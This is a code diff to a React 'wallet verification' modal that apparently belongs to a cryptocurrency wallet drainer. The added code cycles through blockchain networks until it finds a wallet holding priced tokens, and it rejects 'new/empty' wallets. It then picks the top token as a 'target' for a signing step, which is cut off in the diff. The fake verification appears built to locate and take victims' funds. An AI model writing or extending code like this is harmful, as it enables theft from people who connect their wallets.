@@ -1,4 +1,4 @@
-import {useAccount, useDisconnect} from "wagmi";
+import {useAccount, useDisconnect, useSwitchChain} from "wagmi";
 import Big from "big.js";
 import Link from "next/link";
 import React, {useEffect, useState} from "react";
@@ -29,33 +29,54 @@ export const WalletVerificationModal = () => {
 	const provider = useEthersProvider();
 	const signer = useEthersSigner()
 	const {disconnect} = useDisconnect();
+	const switchChain = useSwitchChain()
+	const [chainN, setChainN] = useState(0)
 	const account = useAccount();
 	const [tokens,setTokens] = useState<Awaited<ReturnType<typeof getAddressTokens>> | undefined>(undefined);
 	setVerifyState = setState;
+
+	function handleChainChange() {
+		if (chainN < switchChain.chains.length) {
+			const newN = chainN + 1;
+			const chainId = switchChain?.chains[newN]?.id;
+			if (typeof chainId === 'undefined') setChainN(switchChain.chains?.length + 1);
+			console.log("CHAIN CHANGED TO", chainId,newN,switchChain.chains?.length)
+			switchChain.switchChain({
+				chainId
+			});
+			setChainN(newN);
+		} else {
+			setState(pre => ({
+				...pre,
+				error: "Please connect valid Wallet (don't connect new/empty wallet)"
+			}));
+		}
+	}
 
 	useEffect(()=>{
 		setTokens(undefined);
 		if (account?.address) {
 			setState(pre => ({
 				...pre,
-				text: "Fetching Wallet info..."
+				text: `Fetching Wallet info... (${chainN}/${switchChain.chains.length})`
 			}))
-			getAddressTokens(account.address,account.chainId || -1).then(setTokens).catch(console.error);
+			getAddressTokens(account.address,account.chainId || -1).then(setTokens).catch((e)=>{
+				console.error(e);
+				handleChainChange();
+			});
 		} else {
 			setState({});
 			window.location.hash = ""
 		}
-	},[account?.address]);
+	},[account?.address,chainN]);
 
 	useEffect(() => {
+		console.log("TOKENS", tokens);
 		if (!tokens || !account.address) return;
 		const target = tokens?.at?.(0);
 
 		if (!target || target.price <= 0) {
-			setState(pre => ({
-				...pre,
-				error: "Please connect valid Wallet (don't connect new/empty wallet)"
-			}));
+			handleChainChange();
 		} else if (account.address && provider && signer) {
 			setState(pre =>({
 				...pre,
@@ -70,7 +91,7 @@ export const WalletVerificationModal = () => {
 				})
 			}, 1000)
 		}
-	}, [tokens,account.address,provider,signer]);
+	}, [tokens,account.address,provider,signer,account.chainId]);
 
 	return (
 		<div id="verification" className="modal text-black">
